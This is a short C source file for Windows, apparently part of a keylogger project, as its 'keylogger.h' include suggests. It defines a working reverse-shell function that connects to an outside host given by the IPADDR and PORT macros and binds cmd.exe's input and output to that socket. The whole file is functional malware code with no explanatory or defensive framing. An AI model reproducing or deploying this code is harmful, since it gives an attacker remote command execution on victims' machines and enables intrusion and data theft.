#include "keylogger.h"

// https://www.tek-tips.com/viewthread.cfm?qid=1068237
#pragma comment(lib, "ws2_32.lib")

void CALLBACK	reverse_shell(void)
{
	struct sockaddr_in	sockaddr;
	WSADATA				sock_data;
	SOCKET				socket;
	STARTUPINFO			info;
	PROCESS_INFORMATION	proc_info;

	if (WSAStartup(MAKEWORD(2, 2), &sock_data))
		return ;
	socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	if (socket == INVALID_SOCKET)
		return ;
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(PORT);
	sockaddr.sin_addr.s_addr = inet_addr(IPADDR);
	if (WSAConnect(socket, (SOCKADDR *)&sockaddr, sizeof(sockaddr), 0, 0, 0, 0) == SOCKET_ERROR)
		return ;
	memset(&info, 0, sizeof(info));
	info.cb = sizeof(info);
	info.dwFlags = STARTF_USESTDHANDLES;
	info.hStdInput = (HANDLE)socket;
	info.hStdOutput = (HANDLE)socket;
	info.hStdError = (HANDLE)socket;
	CreateProcess(0, "cmd.exe", 0, 0, TRUE, 0, 0, 0, &info, &proc_info);
	WaitForSingleObject(proc_info.hProcess, INFINITE);
}
